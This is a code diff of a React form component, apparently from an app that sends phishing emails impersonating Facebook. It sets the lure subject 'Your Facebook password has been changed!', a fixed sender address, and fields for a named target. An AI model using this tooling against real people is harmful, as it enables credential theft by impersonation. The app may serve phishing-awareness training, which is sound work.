@@ -87,10 +87,10 @@ export function FacebookForm({ submitHandler, onScheduleEmail }) {
   const { textarea } = textAreaStyles();
 
   // Inputs
-  const [fromEmail, setFromEmail] = useState('');
+  const [subject, setSubject] = useState('Your Facebook password has been changed! ');
+  const [fromEmail, setFromEmail] = useState('phishedapp@gmail.com');
   const [to, setTo] = useState('');
   const [html, setHtml] = useState('');
-  const [subject, setSubject] = useState('');
   const [fname, setFname] = useState('');
   const [lname, setLname] = useState('');
   const [targetName, setTargetName] = useState('');
@@ -103,11 +103,9 @@ export function FacebookForm({ submitHandler, onScheduleEmail }) {
   async function onClick(e) {
     e.preventDefault();
 
-    setFromEmail('');
     setTo('');
     setFname('');
     setLname('');
-    setSubject('');
     setHtml('');
     setTargetName('');
 
@@ -155,16 +153,7 @@ export function FacebookForm({ submitHandler, onScheduleEmail }) {
               onChange={(e) => setLname(e.target.value)}
               required
           />
-          <TextInput
-              label="Sender Email"
-              placeholder="my.email@gmail.com"
-              classnames={classes}
-              mb={12}
-              value={fromEmail}
-              onChange={(e) => setFromEmail(e.target.value)}
-              type="email"
-              required
-          />
+
           <TextInput
               label="Receiver Email"
               placeholder="receivers.email@gmail.com"
@@ -175,26 +164,15 @@ export function FacebookForm({ submitHandler, onScheduleEmail }) {
               type="email"
               required
           />
-
-
-            <TextInput
-                type = "hidden"
-                value={"Verify your account"}
-                onChange={(e) => setSubject(e.target.value)}
-                required
-            />
-
-            <TextInput
-                label="target Name"
-                placeholder="sam"
-                classNames={classes}
-                mb={12}
-                value={targetName}
-                onChange={(e) => setTargetName(e.target.value)}
-                required
-            />
-
-
+          <TextInput
+              label="Target Name"
+              placeholder="Sam"
+              classnames={classes}
+              mb={12}
+              value={targetName}
+              onChange={(e) => setTargetName(e.target.value)}
+              required
+          />
 
 
 
